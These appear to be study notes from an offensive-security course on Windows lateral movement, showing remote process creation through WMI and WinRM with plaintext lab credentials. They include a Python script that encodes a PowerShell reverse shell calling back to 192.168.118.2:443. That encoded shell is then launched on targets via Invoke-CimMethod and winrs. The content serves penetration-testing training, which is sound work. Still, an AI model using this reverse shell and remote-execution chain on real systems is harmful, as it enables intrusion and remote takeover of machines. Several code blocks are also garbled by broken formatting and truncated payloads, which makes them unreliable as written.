- [_Windows Management Instrumentation_](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), which is an object-oriented feature that facilitates task automation.
    
- WMI is capable of creating processes via the _Create_ method from the _Win32_Process_ class. It communicates through [_Remote Procedure Calls_](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.
    
- To demonstrate this attack technique, we'll first briefly showcase the _wmic_ utility, which has been [recently deprecated](https://docs.microsoft.com/en-us/windows/deployment/planning/windows-10-deprecated-features), and then we'll discover how to conduct the same WMI attack via PowerShell.
    
- We already encountered [_UAC remote restrictions_](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction#domain-user-accounts-active-directory-user-account) for non-domain joined machines in the _Password Attacks_ Module. However, this kind of restriction does not apply to domain users, meaning that we can leverage full privileges while moving laterally with the techniques shown in this Learning Unit.
    
- `wmic /node:192.168.226.72 /user:jen /password:Nexus123! process call create "calc"`
    
- ```$username
    $password = 'Nexus123!';
    $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;```
    ```
    
- Now that we have our PSCredential object, we need to create a _Common Information Model_ (CIM) via the [_**New-CimSession**](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2) cmdlet.
    

To do that, we'll first specify DCOM as the protocol for the WMI session with the **New-CimSessionOption** cmdlet on the first line. On the second line, we'll create the new session, **New-Cimsession** against our target IP, using **-ComputerName** and supply the PSCredential object (**-Credential $credential**) along with the session options (**-SessionOption $Options**). Lastly, we'll define 'calc' as the payload to be executed by WMI.

- ```$options
    $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
    $command = 'calc';```
    ```
    
- As a final step, we need to tie together all the arguments we configured previously by issuing the _Invoke-CimMethod_ cmdlet and supplying **Win32_Process** to the _ClassName_ and **Create** to the _MethodName_. To send the argument, we wrap them in **@{CommandLine =$Command}**.
    - `Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};`
- To simulate the technique, we can connect to CLIENT74 as _jeff_ and insert the above code in a PowerShell prompt. (Not all the code is shown below.)  
    - `$username = 'jen'; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};`
- Script:
    - ```
        import sys
        import base64
        
        payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        
        cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
        
        print(cmd)```
        - `python3 encode.py`
        - ```$username = 'jen';
        $password = 'Nexus123!';
        $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
        $Options = New-CimSessionOption -Protocol DCOM
        $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
        $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
        HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
        Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};```
        ```
        

s an alternative method to WMI for remote management, WinRM can be employed for remote host management. WinRM is the Microsoft version of the [_WS-Management_](https://en.wikipedia.org/wiki/WS-Management) protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.

In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is implemented in numerous built-in utilities, such as [_winrs_](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell).

- **winrs**
    
    - `winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
    - `winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
- Make credential variable and enter new PSSesion
    
    - ```$username
        $password = 'Nexus123!';
        $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
        New-PSSession -ComputerName 192.168.226.72 -Credential $credential```
        ```
        
    - `Enter-PSSession 1`